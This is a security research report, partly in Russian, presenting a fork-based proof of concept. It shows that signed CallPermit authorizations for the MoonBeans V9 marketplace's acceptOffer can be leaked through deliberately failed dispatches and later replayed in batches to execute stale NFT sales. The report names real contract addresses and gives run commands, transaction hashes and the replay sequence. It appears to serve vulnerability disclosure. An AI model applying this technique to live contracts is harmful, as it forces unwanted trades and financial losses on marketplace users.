# MoonBeans V9 массовый seller-controlled CallPermit replay: fork PoC

**Дата:** 2026-05-12  
**Verdict:** `SELLER_CONTROLLED_REPLAY_CRITICAL_SUCCEEDED`  
**Скрипт:** `research/replay_moonbeans_mass_seller_controlled_chopsticks.js`  
**Результат:** `research/replay_moonbeans_mass_seller_controlled_result.json`

---

## 1. Цель

Проверить, может ли один seller раскрыть reusable CallPermit authorizations и затем массово исполнить stale sale по нескольким NFT на реальном Moonbeam fork через Chopsticks.

Контракты:

```text
Marketplace V9: 0x683724817a7d526d6256Aec0D6f8ddF541b924de
CallPermit:     0x000000000000000000000000000000000000080a
ERC721:         0x104b904e19fBDa76bb864731A2C9E01E6b41f855
WGLMR:          0xAcc15dC74880C9944775448304B263D191c6077F
```

Function:

```solidity
acceptOffer(address ca,uint256 tokenId,uint256 price,address from,bool escrowedBid)
```

No Solidity mock contracts used.

---

## 2. Важный nonce nuance

У одного seller один последовательный CallPermit nonce. Поэтому одновременно пройти permit validation и затем revert внутри `acceptOffer(...)` может только permit с текущим nonce.

В массовом PoC это выглядит так:

- permit nonce `0` проходит CallPermit validation и падает внутри Marketplace из-за seller-controlled `setApprovalForAll(false)`;
- permits nonce `1..3` при первой публикации падают как future-nonce `Invalid permit`, но тоже публично раскрывают reusable `v/r/s`;
- после восстановления approval и последовательного replay nonce идет `0 -> 1 -> 2 -> 3 -> 4`, и все stale sales исполняются.

Это не ломает массовую эксплуатацию; наоборот, показывает практичный batching pattern: один target-revert leak для current nonce плюс future-nonce public leaks для последующих authorizations.

---

## 3. Как запустить

```powershell
.\node_modules\.bin\chopsticks.cmd --config=moonbeam --port 8017 --build-block-mode Instant
```

```powershell
$env:CHOPSTICKS_WS='ws://127.0.0.1:8017'
$env:RESULT_PATH='research\replay_moonbeans_mass_seller_controlled_result.json'
node research\replay_moonbeans_mass_seller_controlled_chopsticks.js
```

Expected:

```text
SELLER_CONTROLLED_REPLAY_CRITICAL_SUCCEEDED
```

---

## 4. Test Set

Token IDs:

```text
1549, 1551, 1552, 1553
```

Price per NFT:

```text
100000000000000000000
```

Total stale sale value:

```text
400000000000000000000
```

The fork patches those real ERC721 token owners to the test seller and uses the real Marketplace/WGLMR/ERC721 code path.

---

## 5. Setup Transactions

Buyer creates real non-escrowed offers:

```text
token 1549: 0xfa271e6337dd395f2f10fe9c5dc9765ce482fa432e6c4ae68acb8985124912b2
token 1551: 0x6169252ccb70d09457f3f236d74ec05760d494e4aa3fc7ac1f100d84d5878699
token 1552: 0xe22787988acd0cfbcfee963549cad5cf8030ab1fcb3c16848206c0f2bdb514f3
token 1553: 0xaf87debaa414bae787394e6ae95b3a9bbf178f0d281c1c4837d0f5e53bcdde18
```

Seller revokes marketplace approval:

```text
0xa5f50208251ec512d8ad4a8c08e74bd8ad4e8d34efaf65a23b73b82702fc4aa1
```

Seller later restores marketplace approval:

```text
0x215959a0d9eec52677fbe608d9fa91d6f28ee2fce8eb5f0ed78eb51bae6d04e8
```

---

## 6. Published Failed Dispatches

All failed/public dispatches left seller CallPermit nonce at `0`.

```text
token 1549 / nonce 0:
tx 0x294760798292059792ed1b994bfacb97e177a9315ff2cbd694bb3e81aa3e3b6c
revert: Marketplace not approved to tr
nonceAfter: 0

token 1551 / nonce 1:
tx 0x67f746f39c4dbeded95ca280ef48327e4deb9c517c9c7f25697d500e8e43c521
revert: Invalid permit
nonceAfter: 0

token 1552 / nonce 2:
tx 0xa86983ba36e0d461a6b6a3440d3acb92db68fd59f8080c07ba5b11e8c30ce681
revert: Invalid permit
nonceAfter: 0

token 1553 / nonce 3:
tx 0x196059cd522261f36a8b6ae11aa89a154de0ad03577faa860f0dc54bb6793f4f
revert: Invalid permit
nonceAfter: 0
```

For token `1549`, permit validation passed and target reverted inside Marketplace on:

```solidity
require(_nft.isApprovedForAll(msg.sender, address(this)), "Marketplace not approved to transfer this NFT.");
```

For token `1551..1553`, the signatures were future-nonce public leaks. They become replayable as earlier nonces are consumed.

---

## 7. Atomicity After Failed Stage

All atomicity checks passed:

```json
{
  "nonceUnchangedAcrossFailedPublishes": true,
  "wglmrRolledBackAcrossFailedPublishes": true,
  "nftRolledBackAcrossFailedPublishes": true,
  "offersNotAcceptedAcrossFailedPublishes": true
}
```

Meaning:

- no WGLMR transfer survived failed dispatches;
- no NFT transfer survived failed dispatches;
- no offer was marked accepted;
- seller CallPermit nonce remained `0`;
- all calldata and `v/r/s` were public.

---

## 8. Replay Results

After seller restores approval, unrelated dispatcher replays exact same calldata sequentially.

```text
token 1549 / nonce 0:
replay tx 0xafb8b1e52a703fcc4956ab2c5713ff38afff59be1fef070a35e0ba6846caef9d
nonce 0 -> 1
sellerPaymentDelta 100000000000000000000

token 1551 / nonce 1:
replay tx 0x068744d05731b6b2e33b0d498d1c14b40898629b0ba4eb26c0fd980ccf65063a
nonce 1 -> 2
sellerPaymentDelta 100000000000000000000

token 1552 / nonce 2:
replay tx 0x4009fa12747d39840e3d23d3f640c64965bede97a1c293f48851ce88740f2f84
nonce 2 -> 3
sellerPaymentDelta 100000000000000000000

token 1553 / nonce 3:
replay tx 0x1e3e6717969c4a7927b6b4579b90832e44583b5344f1a156af828e66ca9c6fbe
nonce 3 -> 4
sellerPaymentDelta 100000000000000000000
```

Final summary:

```json
{
  "finalNonce": "4",
  "sellerTotalPayment": "400000000000000000000",
  "buyerTotalPayment": "400000000000000000000",
  "allOffersAccepted": true,
  "replayOk": true
}
```

All NFT owners became the buyer:

```text
0x0d0E74c0f8c790C89945B852fa8A5708516641D4
```

---

## 9. Permit Evidence

Dispatch calldata hashes:

```text
token 1549 nonce 0: 0xab9ad1209f5e08146c2c11c778424b3f52b56dc20f1368c71fe8b4b5f5b68c91
token 1551 nonce 1: 0x5b1753d658011816222445d525d75810a964700aa506d633ecb2df3b0a654ad5
token 1552 nonce 2: 0x89d737678a923695de1296b47bdfec5afa1c88dfd746394e7dda4b47775baf81
token 1553 nonce 3: 0x025d65c59b3ec69ee08b368421d1e76ff7d55de91e3182d62d2f32b7c943eeb5
```

Each replay used the exact same dispatch calldata hash as its corresponding failed/public publish.

---

## 10. Verdict

```text
SELLER_CONTROLLED_REPLAY_CRITICAL_SUCCEEDED
```

The PoC proves:

1. One seller can prepare multiple signed `acceptOffer(...)` authorizations.
2. The seller can intentionally create a failed/public CallPermit stage.
3. Current nonce permit can fail inside Marketplace via seller-controlled NFT approval.
4. Future nonce permits can also be publicly leaked and become valid later.
5. Failed stage leaves no WGLMR/NFT/offer side effects.
6. After restore, exact same calldata replay executes all stale sales.
7. Nonce is consumed only on successful replay, sequentially `0 -> 4`.
8. Marketplace state remains consistent: offers accepted only after replay, NFT ownership updates only after replay, WGLMR moves only after replay.

This is a scalable public reusable delayed authorization primitive on the Moonbeam fork, using real deployed contracts and no mocks.
